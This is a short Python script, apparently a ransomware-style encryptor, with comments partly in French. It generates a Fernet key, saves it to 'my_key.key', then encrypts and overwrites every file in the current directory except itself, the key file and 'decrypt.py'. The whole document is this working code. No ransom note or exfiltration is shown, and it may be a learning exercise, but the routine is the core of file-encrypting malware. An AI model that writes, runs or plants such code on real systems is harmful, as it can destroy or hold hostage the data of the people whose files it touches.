#!/usr/bin/python

import os
from cryptography.fernet import Fernet

# Generate a key and store it in a file
my_key = Fernet.generate_key()
with open("my_key.key", "wb") as file_key:
    file_key.write(my_key)

# Stocker le nom des fichiers à chiffrer
files = []
for file in os.listdir():
    if file == "encrypt.py" or file == "my_key.key" or file == "decrypt.py":
        continue
    files.append(file)

# Chiffrer les fichiers
for file in files:

    # Read the content of the file
    with open(file, "rb") as file2encrypt:
        file_content= file2encrypt.read() # Encrypt the content
    file_content_encrypted = Fernet(my_key).encrypt(file_content)

    # Put the encrypted content in the file
    with open(file, "wb") as to_encrypt:
        to_encrypt.write(file_content_encrypted)

